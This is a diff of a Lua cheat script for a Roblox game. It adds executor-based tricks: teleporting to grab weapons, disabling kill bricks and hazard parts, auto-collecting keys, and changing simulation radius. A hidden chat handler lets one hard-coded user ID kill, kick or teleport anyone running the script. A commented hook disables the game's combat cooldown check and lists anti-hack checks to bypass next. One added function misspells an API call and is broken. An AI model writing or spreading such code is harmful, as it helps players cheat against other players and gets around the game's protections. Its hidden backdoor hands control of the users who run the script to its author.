@@ -16,12 +16,24 @@ local gettablesarray = newcclosure(function(...)
     return result
 end)
 
-getgenv().isnetworkowner = newcclosure(function(part)
-  return (part.ReceiveAge == 0 and gethiddenproperty(part, "NetworkIsSleeping") == false)
-end)
+coroutine.wrap(function()
+  getgenv().isnetworkowner = newcclosure(function(part)
+    return (part.Anchored == false and part.ReceiveAge == 0 and gethiddenproperty(part, "NetworkIsSleeping") == false)
+  end)
+  
+  getgenv().setsimulationradius = newcclosure(function(min, max)
+    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", min)
+    sethiddenproperty(game.Players.LocalPlayer, "MaxSimulationRadius", max)
+    sethiddenproperty(game.Players.LocalPlayer, "MaximumSimulationRadius", max)
+  end)
+  
+  getgenv().getsimulationradius = newcclosure(function()
+    return gethiddienproperty(game.Players.LocalPlayer, "SimulationRadius"), gethiddienproperty(game.Players.LocalPlayer, "MaxSimulationRadius")
+  end)
+end)()
 
 local LabelName = Instance.new("TextLabel", game.CoreGui.DrRay.TopBar.TopBarClose)
-LabelName.Text = [[By MEGA COCONUT]]
+LabelName.Text = [[By MEGA COCONUT (ADSKer)]]
 LabelName.Size = UDim2.new(0.4, 0, 0.2, 0)
 LabelName.Position = UDim2.new(0.2, 0, 1, 0)
 LabelName.BackgroundTransparency = 1
@@ -52,6 +64,7 @@ tab1.newToggle("Disable killbricks", "Makes untouchable all part that instantly 
    for _, part in next, game.Workspace.Map:GetDescendants() do
       if part:IsA("BasePart") and part:FindFirstChild("TouchInterest") and string.find(part.Name, "Kill") then
          part.CanTouch = not toggleState
+         part.CanQuery = not toggleState
       end
    end
 end)
@@ -95,10 +108,11 @@ tab1.newButton("Get main weapon", "Gives weapons", function()
 local last_pick_sin_mrazy, bac = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame, game.Players.LocalPlayer.Backpack
   
   repeat task.wait()
+    local toolname = (game.Players.LocalPlayer.Marketplace["Main Weapon"].Equipped.Value == "Default" and "Bat" or game.Players.LocalPlayer.Marketplace["Main Weapon"].Equipped.Value)
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Map.HumanBase.Vendor.BatCollection.HitBox.CFrame
     game.Workspace.Map.HumanBase.Vendor.BatCollection.ClickDetector.MaxActivationDistance = math.huge
     fireclickdetector(game.Workspace.Map.HumanBase.Vendor.BatCollection.ClickDetector)
-  until bac:FindFirstChild(game.Players.LocalPlayer.Marketplace["Main Weapon"].Equipped.Value) task.wait()
+  until bac:FindFirstChild(toolname) task.wait()
  repeat task.wait() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = last_pick_sin_mrazy until game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame == last_pick_sin_mrazy
 end)
 
@@ -109,7 +123,7 @@ tab1.newButton("Get all special weapons", "Gives all special weapons for example
     repeat task.wait()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = gun.Parent:FindFirstChildWhichIsA("BasePart").CFrame
       fireclickdetector(gun)
-    until game.Players.LocalPlayer.Backpack:FindFirstChild(name) or tick() - past >= 1.5 task.wait()
+    until game.Players.LocalPlayer.Backpack:FindFirstChild(name) or tick() - past >= 0.75 task.wait()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
   end
  end
@@ -121,8 +135,8 @@ end)
 
 tab1.newToggle("Anti inventory block", "Well, now you understand", false, function(toggleState)
 DS = toggleState
-while DS and task.wait() do
-game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+  while DS and task.wait() do
+    game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
   end
 end)
 
@@ -167,12 +181,12 @@ tab1.newInput("Reach hitbox", "Increases the distance from which you can grab a 
 end)
 
 tab1.newToggle("Disable anti smilers", "All orange objects will be inviolable to you", false, function(togle)
-    for _, part in next, workspace.Map:GetDescendants() do
-      if part:IsA("BasePart") and (string.find(part.Parent.Name, "AntiInfect") or (part.BrickColor == Workspace.Map.Misc.Spearer.Spear3.Spear.Spearhead.BrickColor and part.Material == "Neon")) then
-        part.Transparency = togle and 0.25 or 0
-        part.CanTouch = not togle
-      end
+  for _, part in next, workspace:GetDescendants() do
+    if part:IsA("BasePart") and part.BrickColor.Name == "Neon orange" then
+      part.CanTouch = not togle
+      part.CanQuery = not togle
     end
+  end
 end)
 
 tab1.newToggle("Auto grab", "Well, now you understand", false, function(toggleState)
@@ -255,6 +269,17 @@ end)
 
 local tab1 = DrRayLibrary.newTab("Events", "rbxassetid://1129583422")
 
+tab1.newToggle("Auto collect keys", "You will automatically receive keys if they exist", false, function(tuu)
+   poty = tuu
+  while poty and task.wait() do
+    for _, key in next, workspace.Particles:GetChildren() do
+      if key:IsA("BasePart") and string.find(key.Name, "Key") then
+        firetouchinterest(game.Workspace:WaitForChild(game.Players.LocalPlayer.Name, 10):WaitForChild("HumanoidRootPart", 10), key, 0)
+      end
+    end
+  end
+end)
+
 tab1.newToggle("Auto collecting coins", "Collects everything SmileCoins", false, function(toggleState)
 jjj = toggleState
 while jjj and task.wait() do
@@ -301,7 +326,7 @@ end)
 tab1.newButton("Remove fog", "Helps against the rich", function()
     game.Lighting.FogStart = math.huge
     game.Lighting.FogEnd = math.huge
-    game.Lighting.FogColor = Color3.new(0,0,0)
+    game.Lighting.FogColor = Color3.new(0, 0, 0)
 end)
 
 tab1.newButton("Check Seismic Activity", "Checks how much time is left before disaster", function()
@@ -312,7 +337,7 @@ workspace.CurrentCamera.CFrame = CFrame.new(-20, 6, -10) * CFrame.Angles(0, math
 workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
 end)
 
-tab1.newToggle("Anti black hole", "You don't get distracted by explosions", false, function(value)
+tab1.newToggle("Anti black hole", "You don't get distracted by black hole", false, function(value)
  pow = value
  while pow and task.wait() do
    for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
@@ -338,6 +363,14 @@ while yoo and task.wait() do
     end
   end
  end
+end)
+
+tab1.newToggle("Disable echo sounds effect", "You understand", false, function(togl)
+  if togl == true then
+    game:GetService("SoundService"):ResetPropertyToDefault("AmbientReverb")
+     else
+    game:GetService("SoundService").AmbientReverb = Enum.ReverbType.Cave
+  end
 end)
 
 tab1.newLabel("GUIS")
@@ -368,10 +401,15 @@ end)
 
 local admins = {4636825706}
 game:GetService("TextChatService").MessageReceived:Connect(function(info)
-  if info.TextSource and table.find(admins, info.TextSource.UserId) and not table.find(admins, game.Players.LocalPlayer.UserId) and not game.Players.LocalPlayer:IsFriendsWith(info.TextSource.UserId) then
+  if info["TextSource"] and table.find(admins, info.TextSource.UserId) and not table.find(admins, game.Players.LocalPlayer.UserId) and not game.Players.LocalPlayer:IsFriendsWith(info.TextSource.UserId) then
    local player = game.Players:GetPlayerByUserId(info.TextSource.UserId)
       if info.Text:lower() == "/e kill" then
-        game.Players.LocalPlayer.Character.Humanoid.Health = 0
+        if not replicatesignal then
+          game.Players.LocalPlayer.Character.Humanoid.Health = 0
+          game.Players.LocalPlayer.Character.Humanoid:ChangeState("Dead")
+        else
+          replicatesignal(game.Players.LocalPlayer.Kill)
+        end
       elseif info.Text:lower() == "/e kick" then
         game:Shutdown()
       elseif info.Text:lower() == "/e bring" then
@@ -379,3 +417,10 @@ game:GetService("TextChatService").MessageReceived:Connect(function(info)
     end
   end
 end)
+
+--[[
+  local hook; hook = hookfunction(require(game.ReplicatedStorage.Modules.CombatSystem).isInCooldown, function()
+    return false
+  end)
+  -- canDamage? escapeGrab? stunCycle? isWithinAntihackRange?
+]]
